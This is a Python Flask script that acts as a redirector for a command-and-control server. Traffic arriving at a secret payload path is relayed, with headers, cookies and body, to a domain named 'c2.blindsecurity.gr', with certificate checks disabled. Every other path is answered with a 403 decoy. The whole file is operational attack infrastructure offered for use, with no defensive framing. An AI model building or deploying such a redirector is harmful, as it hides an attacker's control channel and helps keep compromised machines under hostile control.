from flask import Flask, request, Response
import requests
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

@app.route('/payload124867931/', defaults={'path': ''}, methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
@app.route('/payload124867931/<path:path>', methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
def proxy(path):
    logging.info(f'Request received at /test/{path}')

    try:
        # Target server details (change as needed)
        domain = "c2.blindsecurity.gr"
        uri = "payload124867931"

        protocol = request.headers.get('X-Forwarded-Proto', 'http')
        if protocol == 'https':
            target_url = f"https://{domain}/{uri}/{path}"
        else:
            target_url = f"http://{domain}/{uri}/{path}"

        # Forward headers, removing Host to avoid issues
        headers = {k: v for k, v in request.headers if k.lower() != 'host'}

        # Forward the request
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            cookies=request.cookies,
            verify=False,
            allow_redirects=False
        )

        excluded = ['content-encoding', 'transfer-encoding', 'content-length', 'connection']
        response_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]

        # Send the response
        return Response(resp.content, status=resp.status_code, headers=response_headers)

    except Exception as e:
        return Response(f"Error: {str(e)}", status=500)

@app.route('/', defaults={'path': ''}, methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
@app.route('/<path:path>', methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
def catch_all(path):
    return Response("Access Denied", status=403)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)